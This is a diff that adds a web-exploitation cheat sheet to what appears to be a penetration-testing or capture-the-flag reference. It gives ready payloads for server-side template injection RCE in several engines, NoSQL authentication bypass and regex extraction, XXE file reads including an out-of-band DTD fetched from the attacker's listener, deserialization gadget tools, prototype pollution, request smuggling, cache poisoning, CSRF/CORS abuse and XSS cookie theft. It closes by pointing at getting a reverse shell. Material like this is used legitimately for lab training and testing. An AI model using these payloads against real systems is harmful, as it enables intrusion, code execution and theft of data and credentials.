@@ -88,6 +88,69 @@ predictability, registration of an admin-named account.
 the exact version and `searchsploit` it. Lab CMS installs are usually a single
 CVE away from RCE.
 
+**SSTI — confirm the engine before the payload.** `{{7*7}}`→49 is Jinja2/Twig;
+`${7*7}`→49 is Freemarker/JSP-EL; `#{7*7}` is Ruby/Thymeleaf; `<%= 7*7 %>` is
+ERB/EJS. Then:
+```
+Jinja2:     {{cycler.__init__.__globals__.os.popen('id').read()}}
+Jinja2 alt: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+Twig:       {{['id']|filter('system')}}    or  {{_self.env.registerUndefinedFilterCallback('system')}}
+Freemarker: <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
+Velocity:   #set($e=$rt.getRuntime().exec("id"))
+ERB:        <%= `id` %>
+```
+
+**NoSQL injection** (Mongo etc.) — auth bypass with operator injection:
+```
+POST body: {"user":{"$ne":null},"pass":{"$ne":null}}
+query str: user[$ne]=x&pass[$ne]=x           # when the body is form-encoded
+regex exfil: {"user":"admin","pass":{"$regex":"^a"}}   # boolean-blind, char by char
+```
+
+**XXE** — any XML sink (SOAP, SAML, DOCX/SVG/XML upload, REST accepting
+`application/xml`):
+```xml
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+<!-- blind / OOB: pull an external DTD from your listener that exfils via a param entity -->
+<!DOCTYPE r [<!ENTITY % p SYSTEM "http://<tun0>/e.dtd"> %p;]>
+```
+PHP targets: `php://filter/convert.base64-encode/resource=index.php` as the
+entity to read source. `jar:`/`netdoc:` on Java, `expect://` if the module is
+present for RCE.
+
+**Deserialization** — identify the format by its magic, then build a gadget:
+| Stack | Signal | Tool |
+|---|---|---|
+| Java | `rO0AB` (base64) / `AC ED 00 05` | `ysoserial` (CommonsCollections, etc.) |
+| PHP | `O:8:"…":` in a cookie/param | hand-craft, or `phpggc` |
+| .NET | `ViewState`, `AAEAAAD` base64 | `ysoserial.net` (`TypeConfuseDelegate`) |
+| Python | `pickle` bytes / `gASV` | craft `__reduce__` → `os.system` |
+| Ruby | `Marshal` / `_json` | universal-gadget chains |
+| Node | `_$$ND_FUNC$$_` / `node-serialize` | IIFE payload |
+
+**Prototype pollution** (JS) — `?__proto__[isAdmin]=true`, or a JSON body with
+`"__proto__":{"x":"y"}`. Escalates to RCE when a gadget downstream (template
+engine option, `child_process` opts) reads the polluted property.
+
+**HTTP request smuggling** — front/back disagree on body length. Probe CL.TE and
+TE.CL with a timing differential; confirmed smuggling → prefix another user's
+request, bypass front-end auth, or poison the socket. High-effort; only on boxes
+with a visible proxy layer.
+
+**Web cache poisoning / deception** — unkeyed header (`X-Forwarded-Host`,
+`X-Forwarded-Scheme`) reflected into a cached response → serve your payload to
+others; or trick the cache into storing an authenticated page under a static
+path.
+
+**CORS / CSRF** — `Access-Control-Allow-Origin` reflecting `Origin` with
+`Allow-Credentials: true` → read authed responses cross-site. Missing/weak CSRF
+token on a state-changing route → forge the request. Both matter when the box
+has an admin-bot that visits URLs you supply.
+
+**Client-side to server-side** — an XSS on a page an admin bot visits is a
+credential/cookie theft or an authed-action primitive, not just an alert box.
+Chain it to reach an admin-only route.
+
 ## After exploitation
 
 Whatever the vector, aim for a reverse shell (see `references/foothold.md`) or
